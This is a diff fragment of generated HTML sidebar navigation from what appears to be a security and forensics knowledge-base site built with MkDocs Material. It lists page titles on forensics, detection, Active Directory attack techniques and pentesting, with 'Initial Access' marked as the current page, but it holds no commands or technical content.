+  <span class="md-ellipsis">
+    
+  
+    Authentication &amp; Shell History
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Persistence
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/filesystem-timestamps/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Filesystem &amp; Timestamps
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../linux/logs-and-triage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Logs, Processes &amp; Live Triage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../network/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Network
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../network/zeek/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Zeek
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Zeek
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/zeek/conn-log/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    conn.log
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/zeek/dns-log/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    dns.log
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/zeek/http-log/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    http.log
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/zeek/ssl-x509/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ssl.log &amp; x509.log
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/zeek/files-log/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    files.log &amp; pe.log
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../network/arkime/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Arkime
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Arkime
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/arkime/search-syntax/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Arkime Search Syntax
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/arkime/hunting-workflows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Intrusion Detection with Arkime
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/wireshark-tshark/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wireshark &amp; tshark
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../network/beaconing-c2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Beaconing &amp; C2 Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../memory/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Memory
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Memory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../memory/volatility-workflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Volatility 3 Workflow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../memory/processes-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Processes &amp; Code Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../memory/credentials-registry/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credentials, Registry &amp; Rootkits
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../splunk/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Splunk
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Splunk
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../splunk/spl-cheatsheet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SPL Cheat Sheet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../splunk/data-discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Discovery &amp; Time
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../splunk/rex-and-fields/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    rex, Field Extraction &amp; eval
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../splunk/security-searches/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Searches by Question
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../splunk/hunting-patterns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hunting Patterns in SPL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../splunk/botsv3-workflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BOTSv3 Investigation Workflow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../adversary/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Adversary
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_8" id="__nav_8_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Adversary
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/hardening-by-version/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hardening by Windows Version
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/phishing-delivery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phishing Delivery &amp; Initial Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/powershell-cradles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PowerShell Download Cradles &amp; Encoded Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/lolbins/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LOLBins — Signed Binary Proxy Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/lsass-dumping/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LSASS Credential Dumping
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/sam-ntds-extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SAM, LSA Secrets &amp; NTDS.dit Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/dcsync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DCSync
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/kerberoasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberoasting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/asrep-roasting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AS-REP Roasting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/golden-silver-tickets/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Golden, Silver Tickets &amp; Pass-the-Ticket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/llmnr-ntlm-relay/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLMNR/NBT-NS Poisoning &amp; NTLM Relay
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/adcs-abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Certificate Services Abuse (ESC1 / ESC8)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/pass-the-hash/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pass-the-Hash
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/psexec-smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PsExec &amp; SMB Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/wmi-winrm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WMI &amp; WinRM Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/rdp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RDP — Remote Desktop Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/uac-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    UAC Bypass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/token-impersonation-potato/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Token Impersonation &amp; Potato Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/process-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Process Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/impair-defenses-log-clearing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Impair Defenses &amp; Log Clearing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistence — Services, Tasks, Run Keys
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/eternalblue-smbv1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EternalBlue &amp; SMBv1 Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adversary/printnightmare/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PrintNightmare &amp; Print Spooler Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../pentesting/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pentesting
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_9" id="__nav_9_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pentesting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../pentesting/recon/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recon
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_9_2" id="__nav_9_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Recon
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_2">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../pentesting/recon/nmap/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nmap
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_9_2_2" id="__nav_9_2_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_9_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Nmap
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pentesting/recon/nmap/scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nmap host discovery &amp; port scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pentesting/recon/nmap/service-nse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nmap service enumeration &amp; NSE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pentesting/recon/nmap/output-performance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nmap output &amp; performance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" checked="">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Red Team
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_10" id="__nav_10_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Red Team
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Access
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contents
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../threat-intel/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Intel
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_11" id="__nav_11_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Threat Intel
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../threat-intel/dprk-overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    North Korea (DPRK) — Groups &amp; Incidents
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../threat-intel/dprk-ttps-hunting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    North Korea — TTPs &amp; Hunting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../tools/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_12" id="__nav_12_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tools
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/imaging-collection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Disk &amp; Memory Imaging
+  
+
+    
+  </span>
+  
+  
+
+      </a>
